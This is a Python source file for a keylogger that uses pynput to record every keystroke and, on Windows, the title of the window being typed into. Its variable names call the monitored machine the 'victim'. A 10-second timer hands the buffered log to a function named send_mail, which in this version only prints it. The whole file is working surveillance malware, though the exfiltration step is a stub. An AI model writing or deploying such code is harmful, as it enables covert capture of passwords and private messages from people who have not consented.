import pynput.keyboard, threading, platform

try:
    import win32gui as w
except Exception:
    pass


log = ""
interval = 10
victim_system = platform.system()
lastWindow = "" 


def append_to_log(string):
    global log
    log = log + string
    
def process_key_press(key):
    global lastWindow
    current_key = ""
        
    if victim_system == 'Windows':
        try:
            CurrentWindowName = w.GetWindowText(w.GetForegroundWindow())

            if lastWindow != CurrentWindowName:
                lastWindow = CurrentWindowName
                current_key = f"\n\n[OnWard Data Entered In : {CurrentWindowName}]\n"
        except Exception as e:
            print(f"[!] Failed to Execute \"Log Data Distinguisher Function\" Error: {e} ")
            
    try:
        current_key += str(key.char)
    except AttributeError:
        if key == key.space:
            current_key += " "
                
        elif key == key.enter:
            current_key += " [ENTER] " 

        elif key == key.backspace:
            current_key += " [BACKSPACE] " 

        elif key == key.ctrl_l or key == key.ctrl_r:
            current_key += " [CTRL] " 

        elif key == key.shift or key == key.shift_r:
            current_key += " [SHIFT] " 

        elif key == key.delete:
            current_key += " [DELETE] " 

        elif key == key.esc:
            current_key += " [ESC] " 

        elif key == key.tab:
            current_key += " [TAB] "   

        elif key == key.up:
            current_key += " [UP] " 

        elif key == key.down:
            current_key += " [DOWN] " 

        elif key == key.left:
            current_key += " [LEFT] " 

        elif key == key.right:
            current_key += " [RIGHT] " 
                
        elif key == key.cmd or key == key.cmd_r:
            current_key += " [WINDOWS-KEY] " 

        elif key == key.f1:
            current_key += " [F1] "  

        elif key == key.f2:
            current_key += " [F2] " 

        elif key == key.f3:
            current_key += " [F3] "                 
                
        elif key == key.f4:
            current_key += " [F4] " 

        elif key == key.f5:
            current_key += " [F5] "  

        elif key == key.f6:
            current_key += " [F6] " 

        elif key == key.f7:
            current_key += " [F7] " 
                
        elif key == key.f8:
            current_key += " [F8] " 

        elif key == key.f9:
            current_key += " [F9] "                 
                
        elif key == key.f10:
            current_key += " [F10] " 

        elif key == key.f11:
            current_key += " [F11] "  

        elif key == key.f12:
            current_key += " [F12] " 

        elif key == key.alt_l or key == key.alt_r:
            current_key += " [ALT] "  

        elif key == key.caps_lock:
            current_key += " [CAPSLOCK] " 
                
        elif key == key.home:
            current_key += " [HOME] "                 
                
        else:
            current_key += " " + str(key) + " "
    append_to_log(current_key)    

def send_mail():
    print(log)

def report():
    global log
    send_mail()
    log = ""
    timer = threading.Timer(interval, report)
    timer.start()
   
keyboard_listener = pynput.keyboard.Listener(on_press=process_key_press)
with keyboard_listener:
    report()
    keyboard_listener.join()